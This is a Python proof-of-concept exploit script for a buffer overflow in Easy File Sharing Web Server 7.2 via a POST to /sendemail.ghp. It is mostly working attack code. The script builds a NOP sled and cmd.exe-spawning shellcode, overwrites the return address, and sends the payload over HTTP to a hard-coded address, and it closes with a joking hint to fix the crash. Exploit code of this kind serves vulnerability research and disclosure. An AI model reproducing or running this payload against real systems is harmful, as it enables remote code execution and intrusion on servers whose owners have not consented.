#!/usr/bin/python

# Title : EFS Web Server 7.2 POST HTTP Request Buffer Overflow
# Author : Touhid M.Shaikh
# Date : 12 June, 2017
# Contact: touhidshaikh22@gmail.com
# Version: 7.2
# category: Remote Exploit
# Tested on: Windows XP SP3 EN [Version 5.1.2600]


"""
######## Description ########

    What is Easy File Sharing Web Server 7.2 ?
    Easy File Sharing Web Server is a file sharing software that allows
visitors to upload/download files easily through a Web Browser. It can help
you share files with your friends and colleagues. They can download files
from your computer or upload files from theirs.They will not be required to
install this software or any other software because an internet browser is
enough. Easy File Sharing Web Server also provides a Bulletin Board System
(Forum). It allows remote users to post messages and files to the forum.
The Secure Edition adds support for SSL encryption that helps protect
businesses against site spoofing and data corruption.


######## Video PoC and Article ########

https://www.youtube.com/watch?v=Mdmd-7M8j-M
http://touhidshaikh.com/blog/poc/EFSwebservr-postbufover/

 """

import httplib


total = 4096

#Shellcode Open CMD.exe
shellcode = (
"\x8b\xec\x55\x8b\xec"
"\x68\x65\x78\x65\x2F"
"\x68\x63\x6d\x64\x2e"
"\x8d\x45\xf8\x50\xb8"
"\xc7\x93\xc2\x77"
"\xff\xd0")


our_code = "\x90"*100 #NOP Sled
our_code += shellcode
our_code += "\x90"*(4072-100-len(shellcode))

# point Ret to Nop Sled
our_code += "\x3c\x62\x83\x01" # Overwrite RET
our_code += "\x90"*12 #Nop Sled
our_code += "A"*(total-(4072+16)) # ESP pointing



# Server address and POrt
httpServ = httplib.HTTPConnection("192.168.1.6", 80)
httpServ.connect()

httpServ.request('POST', '/sendemail.ghp',
'Email=%s&getPassword=Get+Password' % our_code)

response = httpServ.getresponse()


httpServ.close()

"""
NOTE : After Exiting to cmd.exe our server will be crash bcz of esp
Adjust esp by yourself ... hehhehhe...
"""

"""
__ __| _ \  |   | |   |_ _| __ \
   |  |   | |   | |   |  |  |   |
   |  |   | |   | ___ |  |  |   |
  _| \___/ \___/ _|  _|___|____/

Touhid M.Shaikh
"""